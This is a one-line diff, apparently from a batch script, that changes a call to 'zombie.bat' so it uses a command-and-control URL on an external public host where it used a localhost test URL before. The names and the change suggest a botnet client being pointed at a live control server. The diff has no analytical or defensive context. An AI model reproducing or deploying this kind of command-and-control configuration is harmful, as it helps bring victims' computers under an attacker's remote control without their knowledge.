@@ -1,1 +1,1 @@
-call zombie.bat http://localhost/cnc/server.php
+call zombie.bat http://emperorpro.altervista.org/server.php
